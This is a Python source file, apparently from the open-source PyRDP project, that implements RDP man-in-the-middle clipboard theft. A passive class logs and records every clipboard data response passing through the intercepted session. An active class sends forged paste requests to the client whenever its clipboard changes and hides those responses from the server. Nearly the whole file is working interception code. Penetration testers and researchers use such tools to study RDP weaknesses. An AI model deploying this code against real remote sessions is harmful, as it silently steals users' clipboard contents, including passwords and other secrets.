#
# This file is part of the PyRDP project.
# Copyright (C) 2018 GoSecure Inc.
# Licensed under the GPLv3 or later.
#

from binascii import hexlify
from logging import Logger

from pyrdp.core import getLoggerPassFilters, Observer
from pyrdp.enum import ClipboardFormatNumber, ClipboardMessageType, PlayerMessageType
from pyrdp.layer import Layer
from pyrdp.parser import ClipboardParser
from pyrdp.pdu import ClipboardPDU, FormatDataRequestPDU, FormatDataResponsePDU
from pyrdp.recording import Recorder


class PassiveClipboardStealer(Observer):
    """
    MITM observer that passively intercepts clipboard data from the clipboard virtual channel as they
    get transferred.
    """

    def __init__(self, layer: Layer, recorder: Recorder, logger: Logger, **kwargs):
        Observer.__init__(self, **kwargs)

        self.clipboardParser = ClipboardParser()
        self.peer = None
        self.layer = layer
        self.recorder = recorder
        self.forwardNextDataResponse = True
        self.mitm_log = getLoggerPassFilters(f"{logger.name}.clipboard")
        self.clipboard_log = getLoggerPassFilters(f"{self.mitm_log.name}.data")

    def onPDUReceived(self, pdu: ClipboardPDU):
        """
        Called when a PDU on the observed layer is received.
        :param pdu: the PDU that was received.
        """

        self.mitm_log.debug("PDU received: %(arg1)s", {"arg1": str(pdu.msgType)})

        if self.peer:
            self.peer.sendPDU(pdu)

    def sendPDU(self, pdu: ClipboardPDU):
        """
        Log and record every FormatDataResponsePDU (clipboard data).
        Transfer only the FormatDataResponsePDU if it didn't originate from the Active clipboard stealer.
        For the other PDUs, just transfer it.
        """
        if not isinstance(pdu, FormatDataResponsePDU):
            self.layer.send(self.clipboardParser.write(pdu))
        else:
            if self.forwardNextDataResponse:
                self.layer.send(self.clipboardParser.write(pdu))
            if isinstance(pdu, FormatDataResponsePDU):
                self.clipboard_log.info("%(clipboardData)s", {"clipboardData": hexlify(pdu.requestedFormatData).decode()})
                self.recorder.record(pdu, PlayerMessageType.CLIPBOARD_DATA)
                self.forwardNextDataResponse = True


class ActiveClipboardStealer(PassiveClipboardStealer):
    """
    Observer that actively sends fake paste requests when the client sends a clipboard changed packet (FORMAT_LIST_RESPONSE).
    """

    def __init__(self, layer, recorder, logger: Logger, **kwargs):
        PassiveClipboardStealer.__init__(self, layer, recorder, logger, **kwargs)

    def onPDUReceived(self, pdu: ClipboardPDU):
        """
        If a format list response is received, send a request to the client for the clipboard data.
        Make sure that the response to this request is NOT transferred to the server, as it can make
        the connection crash.
        For every other messages, just transfer the message normally.
        """
        PassiveClipboardStealer.onPDUReceived(self, pdu)
        if pdu.msgType == ClipboardMessageType.CB_FORMAT_LIST_RESPONSE:
            self.sendPasteRequest()

    def sendPasteRequest(self):
        """
        Send a FormatDataRequest to the client to request the clipboard data.
        Sets a flag is the MITMServerClipboardObserver to make sure that this request
        is not transferred to the actual server.
        """
        formatDataRequestPDU = FormatDataRequestPDU(ClipboardFormatNumber.GENERIC)
        self.peer.sendPDU(formatDataRequestPDU)
        self.forwardNextDataResponse = False
